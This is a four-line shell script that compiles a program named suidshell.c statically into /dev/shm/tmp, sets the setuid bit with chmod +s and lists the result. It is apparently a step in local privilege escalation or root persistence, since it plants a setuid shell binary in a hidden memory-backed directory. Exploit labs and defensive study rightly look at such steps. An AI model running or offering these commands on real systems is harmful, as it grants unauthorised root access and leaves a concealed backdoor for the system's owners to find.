#!/bin/sh

gcc -static suidshell.c -o /dev/shm/tmp
chmod +s /dev/shm/tmp
ls -l /dev/shm/tmp
